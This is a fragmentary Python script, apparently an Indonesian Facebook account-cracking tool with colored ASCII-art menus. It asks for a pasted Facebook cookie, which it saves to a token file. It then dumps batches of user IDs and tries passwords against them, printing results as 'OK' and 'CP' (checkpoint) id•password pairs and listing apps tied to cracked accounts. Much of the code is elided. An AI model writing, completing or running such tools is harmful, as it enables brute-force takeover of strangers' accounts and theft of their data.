...
\x1b[38;5;208m |  \/  | | | / ___|  / \    
\x1b[38;5;208m | |\/| | | | \___ \ / _ \   
\x1b[38;5;208m | |  | | |_| |___) / ___ \  
\x1b[38;5;208m |_|  |_|\___/|____/_/   \_\ 
...
def login_kontol():
	...
	print("""%s    \33[1;32mPASTE COOKIE FACEBOOK """%(h))
	print("""%s\x1b[38;5;208m───────────────────────────────────────────────────────"""%(h))
	pYOUR = input(x+' \x1b[38;5;248m[\x1b[38;5;46m>_\x1b[38;5;248m] \33[1;96mPASTE COOKIE : ')
	akun=open('.token.txt','w').write(pYOUR)
	try:
		tes = requests.get('https://graph.facebook.com/me?access_token='+pYOUR)
		tes3 = json.loads(tes.text)['name']
		print("""%s \n"""%(h))
		print("""%s\x1b[38;5;208m─────────────────────────────────────────────────────────────────────"""%(h))
		jalan('%s [%s>_%s] %s\33[1;96mLOGIN SUCCEED JALANKAN ULANG TOOLS'%(M,P,M,P))
		print("""%s\x1b[38;5;208m─────────────────────────────────────────────────────────────────────"""%(h))
		print("""%s \33[1;96mRun the command python run.py """%(h))
		time.sleep(2.5)
		exit()
	except KeyError:
		print("""%s \n"""%(h))
		jalan('%s [%s>_%s] %sLOGIN FAILED ENTER NEW COOKIE'%(M,P,M,P))
		time.sleep(2.5)
		login_kontol()
	except requests.exceptions.ConnectionError:
...
def result():
	...
	if kz in ['1','01']:
		...
		try:vin = os.listdir('OK')
			...
			back()
		if len(vin)==0:
			haha = '# YOUR BELUM MEMILIKI RESULT OK'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
			gerr = '# RESULTS OK YOUR'
			sol().print(mark(gerr, style='green'))
			cih = 0
			lol = {}
			for isi in vin:
			...
			try:lin = open('OK/'+geh,'r').read()
				...
				time.sleep(2)
				back()
			akun = '# LIST AKUN OK YOUR'
			sol().print(mark(akun, style='green'))
			hus = os.system('cd OK && cat '+geh)
			akun2 = '# LIST AKUN OK YOUR'
			sol().print(mark(akun, style='green'))
			input(x+'['+h+'•'+x+'] Kembali')
			back()
	elif kz in ['0','00']:
...
def file():
	...
	if len(my_files)==0:
		yy = '# YOUR BELUM MEMILIKI RESULT UNTUK DICEK'
...
def dump_massal():
	...
	try:
		...
		pesan = '# INPUT YANG YOUR MASUKKAN BUKAN ANGKA'
		pesan2 = mark(pesan, style='yellow')
		sol().print(pesan2)
		exit()
	if jum<1 or jum>10:
		pesan = '# PASTE JUMLAH ID OM BUKAN ID NYA'
		pesan2 = mark(pesan, style='yellow')
		sol().print(pesan2)
		exit()
	...
	for met in range(jum):
		yz+=1
		kl = input(x+'\33[m[ ? ] \33[1;96m•PASTE ID KE '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
...
def setting():
	print("""%s ════════════════════════════════════════════════════════ """%(h))
	print("""%s \33[m[01] \33[1;32mOLD ACCOUNT"""%(h))
	print("""%s \33[m[02] \33[1;32mNEW ACCOUNT """%(h))
	print("""%s ════════════════════════════════════════════════════════ """%(h))
	...
	if hu in ['1','01']:
		...
		print("""%s \33[1;33mOption Not On Menu"""%(h))
		exit()
...
def passwrd():
	...
	print('')
	print("""%s ●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●● """%(h))
	woi = input(x+'\33[1;96m•Show Crack Result Options? (y/t) : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		exit()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					print(f"\33[1;33m╚══[CP NEW]\33[1;33m{idf}\33[m•\33[1;33m{pw}\n")
					cp+=1
				break
				...
				if 'no' in taplikasi:
					...
					print('\n')
					print(f"\33[1;32m╚══[OK NEW]\33[1;96m{idf}\33[m•\33[1;96m{pw}\n")
					break
					...
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						...
						if "YOUR tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							...
							for muncul in apkAktif:
								...
								hit2+=1
						if "YOUR tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
...
def crack2(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s [NEWV2] %s/%s ~_~ [OK*%s | CP*%s ~_~ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
					...
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						...
						if "YOUR tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							...
							for muncul in apkAktif:
								...
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "YOUR have no expired apps or websites for review" in cek2:
